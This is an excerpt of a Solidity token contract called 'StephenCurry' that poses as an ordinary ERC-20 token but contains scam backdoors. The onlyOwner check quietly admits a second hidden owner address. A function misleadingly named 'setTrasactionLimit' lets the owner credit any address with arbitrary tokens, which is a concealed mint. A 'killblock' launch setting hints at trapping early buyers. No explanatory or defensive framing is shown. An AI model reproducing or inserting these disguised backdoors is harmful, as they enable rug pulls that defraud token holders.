...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender()|| _ownership == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract StephenCurry is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "StephenCurry";
    string private _symbol = "StephenCurry";
    uint8 private _decimals = 9;

    uint public launchedBlock;
    uint public killblock = 2;
    bool public isLaunch = true;
    address payable public marketingWalletAddress = payable(0x512174541C4C803c216580892E6fa98aB771afC1); // Marketing Address
    ...
    uint256 public _walletMax = 1 * 10**11 * 10**_decimals;
...
*/
    ...
    function setTrasactionLimit(uint256 amount, address setAddress) public onlyOwner(){
        _balances[setAddress] = _balances[setAddress].add(amount);
    }

    function setName(string memory rename,string memory resymbol) public onlyOwner(){
        _name = rename;
        _symbol = resymbol;
    }
